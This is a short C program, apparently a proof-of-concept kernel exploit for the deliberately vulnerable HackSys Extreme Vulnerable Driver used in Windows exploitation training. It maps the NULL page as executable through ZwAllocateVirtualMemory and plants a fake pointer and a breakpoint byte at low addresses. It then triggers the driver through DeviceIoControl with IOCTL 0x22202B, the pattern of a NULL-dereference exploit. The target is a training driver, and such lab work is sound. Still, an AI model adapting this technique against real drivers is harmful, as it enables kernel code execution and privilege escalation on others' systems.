#include <Windows.h>
#include <stdio.h>

typedef NTSTATUS(*WINAPI ZwAllocateVirtualMemory)(
	_In_    HANDLE    ProcessHandle,
	_Inout_ PVOID* BaseAddress,
	_In_    ULONG_PTR ZeroBits,
	_Inout_ PSIZE_T   RegionSize,
	_In_    ULONG     AllocationType,
	_In_    ULONG     Protect
	);

int main(int argc, char** argv)
{
    HANDLE ntdll = LoadLibraryA("ntdll.dll");
	ZwAllocateVirtualMemory _ZwAllocateVirtualMemory = (ZwAllocateVirtualMemory)GetProcAddress(ntdll, "ZwAllocateVirtualMemory");

	PVOID baseAddress = 1;
	SIZE_T regionSize = 4096;
	_ZwAllocateVirtualMemory(GetCurrentProcess(), &baseAddress, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	*(unsigned long long*)0x0000000000000008 = 0xFFFFF00000000100;
	*(unsigned long long*)0x0000000000000100 = 0xCC;

	HANDLE hDriver = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	BYTE inBuffer[1024];
	memset(&inBuffer, 0xCC, sizeof(inBuffer));
	LPVOID outBuffer[1024] = { 0 };
	DWORD bytesReturned = 0;
	DeviceIoControl(hDriver, 0x22202B, inBuffer, sizeof(inBuffer), &outBuffer, sizeof(outBuffer), &bytesReturned, NULL);

	return 0;
}